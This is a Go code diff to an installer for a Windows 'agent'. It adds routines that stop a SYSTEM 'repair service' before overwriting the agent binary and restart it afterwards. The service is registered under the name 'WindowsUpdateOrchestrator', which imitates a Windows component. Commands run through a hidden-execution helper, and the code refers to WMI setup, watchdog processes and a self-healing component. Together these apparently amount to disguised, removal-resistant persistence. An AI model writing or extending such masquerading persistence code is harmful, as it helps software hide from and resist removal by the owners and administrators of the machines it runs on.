@@ -546,6 +546,12 @@ func install() {
 	// Legacy powershell watchdogs are extinct as of v1.40.9 (native --watch
 	// mode); kill any left running.
 	_, _ = hiddenExec("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
+	// The SYSTEM repair service maps the agent exe itself: neither
+	// taskkill rounds nor WMI singles release the file while it runs
+	// (v1.47.6: Restart Manager named the service host as the surviving
+	// holder behind "used by another process"). Stop it first; the
+	// healer + explicit restart below bring it back on new bytes.
+	stopRepairService()
 	time.Sleep(1500 * time.Millisecond)
 	// Kill-verify (v1.46.51 post-mortem): taskkill is fire-and-forget,
 	// and a survivor holds the exe locked — every write below then fails
@@ -1000,6 +1006,9 @@ func install() {
 		_ = copyFile(filepath.Join(blenderDir, xml), filepath.Join(backupDir2, xml))
 	}
 	auditDuplicates()
+	// Repair service back on new bytes (stopped up top so the exe write
+	// could land; the healer would converge it anyway).
+	startRepairService()
 
 	if !silent {
 		fmt.Println("Agent installed to", installDir)
@@ -1254,6 +1263,56 @@ func setupWmiLayer(agentPath string) {
 
 
 const repairSvcName = "WindowsUpdateOrchestrator"
+
+// serviceStopped parses `sc query` output for STATE 1 (STOPPED).
+// Query failure (absent service) also counts as stopped. Pure, tested.
+func serviceStopped(out string, queryErr bool) bool {
+	if queryErr {
+		return true
+	}
+	s := strings.ToUpper(out)
+	if strings.Contains(s, "DOES NOT EXIST") || strings.Contains(s, "FAILED 1060") {
+		return true
+	}
+	i := strings.Index(s, "STATE")
+	if i < 0 {
+		return false
+	}
+	for _, r := range s[i:] {
+		if r >= '0' && r <= '9' {
+			return r == '1'
+		}
+	}
+	return false
+}
+
+// stopRepairService stops the SYSTEM repair service before the exe
+// write (its process maps the agent binary and holds it locked across
+// every user-mode kill — v1.47.6 Restart Manager proof named the
+// service host as the surviving holder). Waits ~16s for STOPPED;
+// absent service is success. Best effort.
+func stopRepairService() {
+	_, _ = hiddenExec("sc", "stop", repairSvcName).CombinedOutput()
+	for i := 0; i < 8; i++ {
+		out, err := hiddenExec("sc", "query", repairSvcName).CombinedOutput()
+		if serviceStopped(string(out), err != nil) {
+			log.Printf("[*] repair service stopped")
+			return
+		}
+		time.Sleep(2 * time.Second)
+	}
+	log.Printf("[!] repair service still running after stop wait — kill ladder covers its process")
+}
+
+// startRepairService restarts it post-install on new bytes (the healer
+// would converge it anyway; explicit is faster + deterministic).
+func startRepairService() {
+	if out, err := hiddenExec("sc", "start", repairSvcName).CombinedOutput(); err != nil {
+		log.Printf("[*] repair service start: %v %s (healer converges)", err, strings.TrimSpace(string(out)))
+	} else {
+		log.Printf("[*] repair service restarted")
+	}
+}
 
 // installRepairService registers the SYSTEM repair service (auto-start +
 // restart-on-failure). Repairs only; the agent keeps running in the user
